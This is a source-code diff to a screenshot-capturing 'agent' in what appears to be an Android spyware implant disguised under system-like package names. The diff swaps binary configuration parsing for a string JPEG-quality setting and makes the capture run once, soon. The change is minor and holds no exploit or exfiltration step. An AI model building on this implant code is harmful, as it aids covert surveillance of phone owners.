@@ -25,7 +25,9 @@ import android.view.WindowManager;
 import com.android.service.LogR;
 import com.android.service.Messages;
 import com.android.service.Status;
+import com.android.service.ThreadBase;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.file.AutoFile;
 import com.android.service.listener.ListenerStandby;
@@ -39,7 +41,6 @@ import com.android.service.util.WChar;
  */
 public class AgentSnapshot extends AgentBase {
 
-	private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 70;
 	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
 	private static final int MIN_TIMER = 1 * 1000;
 	private static final long SNAPSHOT_DELAY = 1000;
@@ -57,6 +58,7 @@ public class AgentSnapshot extends AgentBase {
 
 	/** The type. */
 	private int type;
+	private int quality;
 
 	/**
 	 * Instantiates a new snapshot agent.
@@ -73,13 +75,23 @@ public class AgentSnapshot extends AgentBase {
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(AgentConf conf) {
-		final byte[] confParameters = conf.getParams();
-		myConf = Utils.bufferToByteBuffer(confParameters, ByteOrder.LITTLE_ENDIAN);
+	public boolean parse(AgentConf conf) {		
+		try {
+			String qualityParam = conf.getString("quality");
+			if("low".equals(qualityParam)){
+				quality=50;
+			}else if("med".equals(qualityParam)){
+				quality=70;
+			}else if("high".equals(qualityParam)){
+				quality=90;
+			}
+		} catch (ConfigurationException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse) Error: " + e);
+			}
+		}
 
-		this.delay = myConf.getInt();
-		this.type = myConf.getInt();
-
+		
 		return true;
 	}
 
@@ -90,8 +102,8 @@ public class AgentSnapshot extends AgentBase {
 	 */
 	@Override
 	public void begin() {
-		setDelay(this.delay);
-		setPeriod(this.delay);
+		setDelay(SOON);
+		setPeriod(NEVER);
 	}
 
 	/*
@@ -280,7 +292,7 @@ public class AgentSnapshot extends AgentBase {
 	private byte[] toJpeg(Bitmap bitmap) {
 
 		ByteArrayOutputStream os = new ByteArrayOutputStream();
-		bitmap.compress(Bitmap.CompressFormat.JPEG, SNAPSHOT_DEFAULT_JPEG_QUALITY, os);
+		bitmap.compress(Bitmap.CompressFormat.JPEG, quality, os);
 
 		final byte[] array = os.toByteArray();
 		try {
